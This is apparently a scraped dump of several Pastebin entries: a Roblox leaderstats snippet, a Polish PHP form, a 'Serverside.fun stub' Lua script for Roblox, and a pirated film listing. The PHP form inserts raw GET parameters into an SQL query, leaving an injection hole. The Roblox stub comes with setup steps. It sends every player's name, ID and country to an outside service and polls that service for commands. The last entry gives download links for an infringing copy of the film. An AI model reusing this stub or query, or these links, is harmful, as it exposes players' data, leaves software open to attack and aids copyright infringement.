	leaderstats.Name = ""leaderstats""
	
	local Wins = Instance.new(""IntValue"",leaderstats)
	Wins.Name = ""Wins""
	Wins.Value = 0
	
	while wait(5) do
		Wins.Value += 1 -- For testing
	end
	 
end)"
DxzNQXxm,dodawanie,ppiso,PHP,Sunday 7th of January 2024 03:22:46 PM CDT,"    <?php
    //echo ""dodawanie"";
    if(ISSET($_GET['mode']))
        {
            if($_GET['mode']==""dodaj"")
            {
                $query=""INSERT INTO rozklad (rozklad_id,dzien,zajecie,priorytet) VALUES ('{$_GET ['rozklad_id']}', '{$_GET ['dzien']}', '{$_GET ['zajecie']}', '{$_GET ['priorytet']}')"";
                $connect->query($query);
            }  
        }
    ?>
    <form action=""index.php"" method=""get"">
        <table>
            <tr>
                <td>rozklad_id</td>
                <td><input type=""number"" name=""rozklad_id"" placeholder=""id""></td>
            </tr>
            <tr>
                <td>dzien</td>
                <td><input type=""text"" name=""dzien"" placeholder=""dzien""></td>
            </tr>
            <tr>
                <td>zajecie</td>
                <td><input type=""text"" name=""zajecie"" placeholder=""zajecie"" ></td>
            </tr>
            <tr>
                <td>priorytet</td>
                <td><input type=""number"" min=""1"" max=""255"" name=""priorytet"" placeholder=""priorytet""></td>
            </tr>
        </table>
    <input value=""dodaj""name=""mode"" type=""submit"" >
    </form>"
uXZDPN8K,Serverside.fun Stub Module Script,darraghd493,Lua,Sunday 7th of January 2024 03:04:17 PM CDT,"--[[
How to use this:
 - Fill out the settings (I suggest you leave SCRIPT_LOGGING on)
 - Create a game with this inserted into it (must be published & running on Roblox, no studio)
 - Done! :)
]]

-- Settings
local WHITELIST_USERNAME = """" -- Roblox username (whitelisted)
local WHITELIST_USER_ID = -1-- Roblox user id (whitelisted)
local WHITELIST_GAME_ID = game.GameId -- Roblox game id (fakes what game your in)
local SCRIPT_LOGGING = true -- Whether you want scripts executed to be logged to the serverside.fun (WARNING: POTENTIALLY DANGEROUS!)

-- Variables
local GET_PLAYERS_URL = ""https://api.serverside.fun/v1/get-players""

local LocalisationService = game:GetService(""LocalizationService"")
local HttpService = game:GetService(""HttpService"")
local Players = game:GetService(""Players"")

-- Stub
local response = HttpService:GetAsync(""https://api.serverside.fun/v1/check-whitelist/"" .. WHITELIST_USER_ID .. ""/"" .. tostring(WHITELIST_GAME_ID))
local user_data = HttpService:JSONDecode(response)

print(response) -- Used for testing (check output in server console)

if user_data.whitelisted ~= false then
	local function getPlayerData()
		local playerData = {}
		for i, v in ipairs(Players:GetPlayers()) do
			local country = ""Unknown""
			pcall(function()
				country = LocalisationService:GetCountryRegionForPlayerAsync(v)
			end)
			table.insert(playerData, {username = v.Name, userid = v.UserId, displayName = v.DisplayName, country = country})
		end
		return playerData
	end

	local function postPlayerData()
		task.wait(0.5)
		if Players:FindFirstChild(WHITELIST_USERNAME) then
			HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = getPlayerData(), robloxId = WHITELIST_USER_ID}))
		end
	end

	local posted_removing_1 = true
	local posted_removing_2 = false

	local function postPlayerRemovingData()
		task.wait(1)
		if Players:FindFirstChild(WHITELIST_USERNAME) and posted_removing_1 == true then
			postPlayerData()
		else
			posted_removing_1 = false
			if posted_removing_2 == false then
				HttpService:PostAsync(GET_PLAYERS_URL, HttpService:JSONEncode({value = {}, robloxId = WHITELIST_USER_ID}))
				posted_removing_2 = true
			end
		end
	end

	pcall(function()
		postPlayerData()
		Players.PlayerAdded:Connect(postPlayerData)
		Players.PlayerRemoving:Connect(postPlayerRemovingData)
	end)

	-- Premium script polling
	if user_data.type ~= ""NORMAL"" then
		pcall(function()
			local premium_script_poll_data = HttpService:JSONDecode(HttpService:GetAsync(""https://api.serverside.fun/v1/private-scripts/"" .. WHITELIST_USER_ID))
			for i, v in ipairs(premium_script_poll_data.scripts) do
				pcall(function()
					if v == ""r6()"" then
						print(""premium r6 stub (3436957371)"")
					elseif v == ""re()"" then
						print(""premium reset stub (load character)"")
					elseif v:match(""USERNAME"") then
						print(""premium hub/custom stub ("" .. tostring(v) .. "")"")
					else
						print(""premium custom stub ("" .. tostring(v) .. "")"")
					end
				end)
			end
		end)
	end

	-- Normal script polling
	local script_poll_url = ""https://api.serverside.fun/v1/long-polling/kkwAhfSFRnAyAoffQYNEEviBUAVs/"" .. WHITELIST_USER_ID
	while true do
		local success, error = pcall(HttpService.GetAsync, HttpService, script_poll_url)
		if success then
			local success_2, error_2 = pcall(HttpService.JSONDecode, HttpService, error)
			if success_2 then
				if error_2 and error_2[""script""] then
					if Players:FindFirstChild(WHITELIST_USERNAME) then
						local polled_script = error_2[""script""].script
						if WHITELIST_USER_ID == tonumber(error_2[""script""].robloxId) then
							if polled_script == ""r6()"" then
								print(""r6 stub (3436957371)"")
							elseif polled_script == ""re()"" then
								print(""reset stub (load character)"")
							elseif polled_script:match(""USERNAME"") then
								print(""hub/custom stub ("" .. tostring(polled_script) .. "")"")
							else
								print(""custom stub ("" .. tostring(polled_script) .. "")"")
							end
							if SCRIPT_LOGGING then
								pcall(function()
									HttpService:PostAsync(""https://api.serverside.fun/v1/script-logs"", HttpService:JSONEncode({
										[""script""] = polled_script,
										[""robloxId""] = tostring(WHITELIST_USER_ID),
										[""gameId""] = tostring(WHITELIST_GAME_ID)
									}))
								end)
							end
						end
					end
				end
			end
		end
		task.wait()
	end
end
"
b2NAnJ1Y,Hui.Buh.und.das.Hexenschloss.2022.Dual.Deu.Spa.720.h264.ac3.Subs-bp,bpmircea,BrainFuck,Sunday 7th of January 2024 02:57:20 PM CDT,"Hui Buh und das Hexenschloss (Hui Buh and the Witchs Castle) (Sebastian Niemann, 2022)
aka
Hui.Buh.und.das.Hexenschloss.2022.Dual.Deu.Spa.720.h264.ac3.Subs-bp
https://www.imdb.com/title/tt14176696/

http://up-4.net/d/sUr2
https://filecrypt.cc/Container/D03621D225.html
https://t.me/DeuFree/1468

Audio tracks: de es | Subtitles: de en es ru"
